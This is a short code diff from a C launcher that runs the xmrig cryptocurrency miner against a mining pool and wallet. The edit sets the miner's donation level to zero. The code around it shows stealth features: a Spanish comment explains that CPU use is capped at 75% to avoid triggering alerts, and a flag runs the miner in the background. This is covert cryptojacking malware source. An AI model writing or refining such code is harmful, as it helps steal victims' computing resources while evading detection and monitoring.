@@ -115,7 +115,7 @@ int main(int argc, char *argv[], char *envp[]) {
         "-o", POOL_URL,
         "-u", WALLET_ADDR,
         "-p", PASSWD,
-        "--donate-level", "1",
+        "--donate-level", "0",
         "--cpu-max", "75", // No quemar la CPU para evitar alertas
         "-B", // Background (aunque execve lo maneja, xmrig tiene flag)
         NULL
